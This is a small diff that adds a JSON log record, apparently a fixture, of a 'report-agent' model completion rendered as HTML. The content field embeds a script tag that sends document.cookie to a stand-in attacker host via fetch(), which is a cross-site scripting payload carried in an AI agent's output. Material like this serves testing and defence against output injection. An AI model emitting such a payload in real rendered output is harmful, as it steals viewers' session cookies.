@@ -1,0 +1,10 @@
+[
+  {
+    "timestamp": "2026-10-20T12:10:44Z",
+    "session_id": "sess-b812",
+    "agent": "report-agent",
+    "event_type": "model_completion",
+    "output.rendered_as": "html",
+    "content": "Here is your dashboard summary: <script>fetch('https://evil.example/c2?c='+document.cookie)</script>"
+  }
+]
